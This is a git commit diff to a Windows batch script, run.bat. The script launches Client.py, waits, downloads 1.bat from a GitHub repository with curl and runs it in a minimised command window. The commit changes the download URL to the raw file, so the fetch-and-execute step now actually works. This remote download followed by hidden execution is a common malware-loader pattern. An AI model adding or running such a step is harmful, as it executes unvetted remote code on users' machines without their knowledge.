9bb0ab80d1a788f43df0c4fdde77151260949d4b
oogabooga245 <68644080+oogabooga245@users.noreply.github.com>
2024-06-12 01:59:15 -0600

    Update run.bat

--- run.bat
+++ run.bat
@@ -5,6 +5,6 @@ python3 Client.py
 goto :run
 :run
 timeout 10 >nul
-curl -o 1.bat https://github.com/oogabooga245/-/blob/main/1.bat
+curl -o 1.bat https://raw.githubusercontent.com/oogabooga245/-/main/1.bat
 START /MIN CMD.EXE /C 1.bat
 exit
